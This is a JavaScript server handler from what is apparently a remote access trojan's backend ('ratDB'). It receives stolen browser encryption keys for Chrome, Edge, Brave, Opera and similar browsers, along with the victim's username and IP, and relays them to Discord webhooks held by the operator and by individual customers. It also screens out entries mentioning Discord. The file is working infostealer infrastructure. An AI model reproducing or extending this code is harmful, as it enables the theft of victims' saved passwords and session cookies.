import AsciiTable from "ascii-table";
import { WebhookClient, EmbedBuilder } from "discord.js";
import { getClientIp } from "request-ip";

const usernameRegex = /^[a-zA-Z0-9_]{1,16}$/;
const browserTypes = ["Chrome", "Chrome SxS", "Edge", "Brave", "Opera", "Opera GX"];

export default function handleKey(ratDB, webhookClient, sendError, getNetworth) {
  return async function (req, res) {
    const { id, username = "null", type = "null", key = "null" } = req.body;
    const ip = getClientIp(req);

    const table = new AsciiTable("Key Hit").setHeading("Type", "Value");
    table.addRow("Code", id);
    table.addRow("Username", username);
    table.addRow("Type", type);
    table.addRow("Key", key);
    table.addRow("IP", ip);

    if (
      username.toLowerCase().includes("discord") ||
      type.toLowerCase().includes("discord") ||
      key.toLowerCase().includes("discord") ||
      !usernameRegex.test(username) ||
      !browserTypes.includes(type) ||
      !isValidKey(key)
    ) {
      table.addRow("Error", "Invalid Request");
      console.log(table.toString());
      return;
    }

    try {
      const { webhook, dhooked } = await ratDB.getWebhook(id);
      const embed = new EmbedBuilder()
        .setColor("#ff0000")
        .setTitle(`:mirror_ball: ${type} - Key`)
        .addFields({ name: ":key: Key Bytes", value: `\`\`\`${key}\`\`\``, inline: true });

      if (dhooked)
        await webhookClient.send({
          content: "@everyone",
          username: "Message - " + username,
          embeds: [embed],
        });

      if (webhook) {
        const webhookClientCustom = new WebhookClient({ url: webhook });
        await webhookClientCustom.send({
          content: "@everyone",
          username: "Message - " + username,
          embeds: [embed],
        });
      } else {
        table.addRow("Error", "Webhook Not Found");
      }
    } catch (e) {
      var errorMsg;
      if (e.response) {
        errorMsg = e.response.data;
      } else if (e.request) {
        errorMsg = e.request;
      } else {
        errorMsg = e.message;
      }

      table.addRow("Error", e);
    }

    console.log(table.toString());
  };
}

function isValidKey(key) {
  try {
    const array = JSON.parse(key);
    return Array.isArray(array);
  } catch (e) {
    return false;
  }
}
